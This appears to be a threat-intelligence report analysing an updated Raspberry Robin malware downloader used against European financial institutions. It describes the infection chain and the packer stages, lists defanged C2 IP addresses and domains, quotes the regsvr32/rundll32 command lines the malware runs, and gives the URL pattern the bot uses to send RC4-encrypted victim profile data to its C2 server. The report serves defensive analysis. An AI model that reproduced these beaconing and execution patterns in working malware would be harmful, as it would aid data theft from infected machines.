This well-designed automated framework allows attackers post-infection capabilities to\nevade detection, move laterally and leverage trusted cloud infrastructures of known data hosting providers such as\nDiscord, Azure & Github, among rest.\n\nThreat researchers Felipe Duarte, Charles Lomboni & Shlomit Chkool, responded to similar incidents twice this\nmonth and in each case were able to dissect the downloader from its parent wrapper and unveil the malware which\npointed to the aforementioned Raspberry Robin framework.\n\n\n-----\n\nWhat is unique about the malware is that it is heavily obfuscated and highly complex to statically disassemble.\nDynamically peeling back one layer at a time, the researchers were ultimately able to find the inner config of the\n[malware and get the Indicators of Compromise (IOCs) contained within it. Reading recent articles from TrendMicro &](https://www.trendmicro.com/en_us/research/22/l/raspberry-robin-malware-targets-telecom-governments.html)\n[Microsoft, the researchers were able to successfully attribute the attack to Raspberry Robin, as the IOCs overlapped](https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/)\nwith the Raspberry Robin infrastructure and Tactics, Techniques & Procedures (TTPs). In both attacks, the same IP\naddress stood out - 85.56.236[.]45.\n\nThe IP address was spotted by [@1ZRR4H, researcher at cybersecurity firm CronUp, who linked it to a Cybereason](https://twitter.com/1ZRR4H/status/1588766861612617728?s=20&t=aSH2KS7ZLNwAD8T7FD1dHg)\narticle. In his tweet he also mentions the use of a QNAP server, which is the technology behind the infamous IP\naddress.\n\n\"The difference between what we saw in our investigation comparing to previously documented research is that\nRaspberry Robin operators suddenly began to collect much more data about their victims\", said Threat Researcher,\nCharles Lomboni.\n\n\"Not only did we discover a version of the malware that is several times more complex, but we also found that the C2\nbeaconing, which used to have a URL with a plain-text username and hostname, now has a robust RC4 encrypted\npayload,\" added Senior Threat Researcher Felipe Duarte, who led the investigation along with the company's CEO &\nFounder, Ido Naor.\n\nThe article in nutshell:\n```\n(1) Raspberry Robin is targeting the financial sector in Europe.\n\n(2) Victimology focuses on Spanish and Portuguese speaking organizations.\n\n(3) Attackers have begun collecting more victim machine data.\n\n(4) Downloader mechanism was updated with new anti-analysis capabilities.\n\n(5) The same QNAP server is being used for several rounds of attacks, but victim data is no longer in\nplain-text. It is RC4 encrypted.\n\n## 1st Case\n\n```\nShellcode activity was detected using custom rules added to the client's XDR solution, resulting in beacons being\nsent to a C2 server via a Tor connection.\n\nThe forensics investigation showed that a 7zip file downloaded from the victim's browser, potentially from a malicious\nlink or attachment that tricked the user into taking action. Upon inspection, the archive was found to be an MSI\ninstaller that, when executed, drops several files onto the victim's machine.\n\n\n-----\n\nThe packed version of the MSI was spotted on Virus Total and had only 5 detections at the time. As can be seen\nfrom the screenshot, it is 482.74MB in size. However, when unpacked, the file is only 1.24MB in size and its\ndetections are much more informative when the binary is tested against known protection engines.\n\nWhile analyzing the suspected file, we identified the IP address 85.56.236[.]45, which used as a C2 server to\ndownload additional modules of the framework. Once the modules are installed, all traffic is routed through Tor. An\nexample of the execution of two of those modules (zhddmeb.dll & gikfjit.dll) is shown below.\n```\nProcess : C:\\Windows\\SysWOW64\\regsvr32.exe Started with CMD : C:\\WINDOWS\\syswow64\\regsvr32.exe zhddmeb.dll\n\nProcess : C:\\Windows\\SysWOW64\\rundll32.exe Started with CMD : C:\\WINDOWS\\syswow64\\rundll32.exe gikfjit.dll,\nahdp\n\n```\nThe process dump of rundll32.exe reveals the C2 server and the request used by the botnet to beacon back home. It\nshows a similar pattern to the one shared by Microsoft in its report, but not the exact same. In fact, this was the first\nindication that the threat actors have updated several internal modules of this infamous botnet.\n\n\n-----\n\n## 2nd Case\n\nIn this case, we started our investigation with a suspicious ZIP file downloaded by the user from Microsoft Edge,\nprobably through a malicious advertisement campaign hosted on eu[.]adbison-redirect[.]com. This domain has bad\n[reputation and has been reported as an adware source, which increases suspicions that the Raspberry Robin attack](https://malwaretips.com/blogs/remove-eu-adbison-redirect-com/)\nframework is merely \"riding\" on top of the campaign.\n\nOnce the user interacts with the malicious advertisement, they are redirected to an intermediary server\n135.148.169[.]133 that provides the final URL where the malicious code is hosted.\n```\nhxxps://eu.adbison-redirect[.]com/click?payload=eyJzZXNzaW9uX3V1aWQiOiI0MGZiZGE0NS02...\n\n```\nThe IP address is hidden in the Base64 payload.\n```\n{\"session_uuid\":\"XXXXda45-XXXX-41ef-8112-820e2a85XXXX\",\"worker_host\":\"135.148.169[.]133\"...}\n\n```\nThis intermediate server also runs Prometheus, which allows the performance of the campaign to be monitored, as\nshown below:\n\nTo avoid detection and bypass security controls the malicious payload is hosted on a Discord server:\n\n\n-----\n\n```\n  p pp[ ] _\n\n```\nAlthough the domain is not malicious, it is actively being used by the threat actors to deliver malware onto the victim\nmachine.\n\nThe malicious file, named File_Part.1.zip, contains encoded JScript code that, upon execution, drops a DLL in the\nTemp folder and executes it using known Raspberry Robin command-line characteristics:\n```\nC:\\Windows\\System32\\rundll32.exe\" shell32 ShellExec_RunDLL regsvr32 -s \"C:\\Users\\user\\AppData\\Local\\Temp\\\n[RANDOM_NAME].\n\n## New Downloader Anatomy\n\n```\nSeveral things have been improved in the latest version of the downloader, including the execution mechanism, code\nobfuscation and added encryption layer. It seems that developers were busy in this iteration adding protections to\ntheir code to avoid security tools and the curious eyes of malware analysts.\n\nAccording to the new version, it is not longer necessary to use the blend of LNK files with CMD commands, as\nreported by several antivirus vendors in the past. This technique was used in the past to launch the Windows binary\n_msiexec.exe to fetch additional content from internet. Now, we have a more complex malware protection mechanism_\nimplements at least five layers of protections before executing the actual malicious code, which is now compiled as a\nx86 shellcode available only in memory.\n\nTo make the analysis of this wrapper easier for the reader to understand, we have divided the infection flow into three\ndifferent stages, which are presented in the following screenshot. All the details related to each stage are explained\nin the subsections below.\n\n\n-----\n\n### First Stage - Generic Packer\n\nThis layer of protection exists solely to obscure the code of the next stages of the attack. To accomplish this, once it\nis executed, it decrypts in its memory space a small shellcode and the Second Stage Loader DLL (see Figure 3) in\nits memory space.\n\nThe shellcode is then executed and used to resolve all imports required by the new DLL. Its final action will be to\nlaunch that DLL. It's worth mentioning that this shellcode implements a technique to pass execution to the DLL and\ndeletes itself from memory.\n\n\n-----\n\nThis is done using the following instructions:\n```\nPUSH SC_BASE\n\nPUSH DLL_ENTRYPOINT\n\nJMP VirtualFree\n\n### Second Stage - Intermediate Obfuscation\n\n```\nThis component is complex, time-consuming and dependent upon the researcher's level of Reverse Engineering\nskills. However, the Security Joes incident response team, which includes seasoned researchers, successfully\naccomplished this task, and the next paragraph will share its conclusions.\n\nThe purpose of this artifact is simple - to hide the Shellcode _Downloader as much as possible from the researcher_\nand evade automated security controls. This is done by obfuscating the control-flow with a large amount of unused\ninstructions (see Figure 4) and an additional shellcode (Intermediate Shellcode) which is decrypted and executed at\nrun-time.\n\nThis last shellcode is the one that finally launches the main logic of the Shellcode Downloader.\n\n### Third Stage - Shellcode Downloader\n\nAs mentioned by Microsoft, C2 servers used by Raspberry Robin are usually compromised QNAP devices exposing\nthe port 8080 and using a constant URL pattern in the request parameters.\n\n\n-----\n\nIn previous versions of this malware, the interaction between bots and attackers' infrastructure was mainly used for\nthe sole purpose of downloading the corresponding payloads and complete the infection. It didn't seem to have any\npurpose for gathering information from infected machines. Operators limited the reconnaissance to merely username\nand hostname of the victim machine, sent in plain-text directly in the URL:\n```\nhttp://[C2_SERVER_IP]:8080/[RANDOMLY GENERATED PATH]/[HOSTNAME]?[USERNAME]\n\n```\nThis behavior had dramatically changed in the latest infections spotted in the wild by Security Joes. In those cases\nwe investigated, threat actors decided to implement additional validations on their backend to have a better\nsegmentation and visibility of their targets. This allows them to filter bots running in sandboxes, analyze\nenvironments and respond to any other circumstance that could interfere a segment of the botnet operation, to fix it\nin real-time. This also provides operators the possibility of deploying different payloads based on the system\ninformation of the machine and even deceiving security researchers as was previously reported by TrendMicro.\n\n**Enriching C2 Comms**\n\nTo be more specific, the attackers behind Raspberry Robin decided to profile victims using the following parameters:\n```\n(1) [C2_SERVER_IP] - C2 server IP (From previous attacks)\n\n(2) [HEADER] - 4 hardcoded bytes used to determine the start of the data\n\n(3) [PEB_DATA] - Contents of the Process Environment Block (PEB).\n\n(4) [UUID] - Unique identifier generated using the MAC address of the machine\n\n(5) [MINUTES_ON] - Number of minutes that have elapsed since the system was started\n\n(6) [HOSTNAME]*[USERNAME] - Hostname and username tuple (From previous attacks)\n\n(7) [HEXLIFY_PROCESSOR_NAME] - Processor name\n\n(8) [DISPLAY_DEVICE] - Information about the display devices in the machine\n\n```\nAll this information is now encrypted using RC4 with a hardcoded key, which is appended to the URL using the ASCII\nrepresentation of the hexadecimal values. This new structure, creates the following request pattern:\n```\nhttp://[C2_SERVER_IP]:8080/hexlify(rc4([HEADER]))hexlify(rc4([PEB_DATA]*[UUID]*[MINUTES_ON]*[HOSTNAME]*\n[USERNAME]*[HEXLIFY_PROCESSOR_NAME]*[DISPLAY_DEVICE]))\n\n```\n**Downloader Logic**\n\nThe general logic of the downloader was also tweaked, adding additional validations and encryption-related code.\n\n\n-----\n\nWe can summarize this new logic as follows:\n\n1. Verifies if the victim has been previously infected by this malware via the registry key\n\n_SOFTWARE\\Microsoft\\Multimedia\\Active._\n\n2. Creates a profile of the victim's machines including some system-related information such as the hostname,\n\nusername, processor name and additional data from the video devices available in the machine.\n\n3. System profile is encrypted with RC4, using a hard-coded key, and it is sent to the C2 server.\n\n4. C2 server provides the corresponding payload (a Windows executable) according to the victim's profile.\n\n5. This new PE file is finally executed using the Windows API WinExec.\n\nIt is worth mentioning that the bot does not do a good job validating the content provided by the C2 server before\nexecuting it, it just checks the MZ header at the beginning of the file before launching it.\n\n## Conclusions\n\nSecurity Joes incident response team has learned that hacking groups are using a new version of Raspberry Robin\nto attack financial institutes in Europe.
